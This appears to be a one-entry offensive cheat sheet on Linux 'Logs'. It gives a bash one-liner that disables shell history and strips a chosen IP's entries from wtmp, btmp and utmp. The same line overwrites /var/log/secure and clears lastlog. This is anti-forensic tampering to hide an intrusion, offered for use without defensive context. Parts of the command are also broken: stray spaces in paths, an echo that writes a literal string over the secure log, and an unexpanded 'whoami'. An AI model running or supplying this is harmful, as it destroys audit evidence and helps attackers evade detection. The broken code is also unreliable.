# Logs

## Linux

```bash
export HISTFILE=""; EYE_PEE="redacted_ip"; [ -e "/var/log/wtmp" ] && utmpdump /var/log/wtmp | grep -v $EYE_PEE > /tmp/.wt && utmpdump -r < /tmp/.wt > /var/log/wtmp && rm -f /tmp/.wt; [ -e "/var/log/ btmp" ] && utmpdump /var/log/btmp | grep -v $EYE_PEE > /tmp/.bt && utmpdump -r < /tmp/.bt > /var/log/btmp && rm -f /tmp/.bt; [ -e "/var/log/utmp" ] && utmpdump /var/log/utmp | grep -v $EYE_PEE > /tm p/.ut && utmpdump -r < /tmp/.ut > /var/log/utmp && rm -f /tmp/.ut; [ -e "/var/log/secure" ] && echo grep -v $EYE_PEE /var/log/secure > /var/log/secure; lastlog -u whoami -C

```
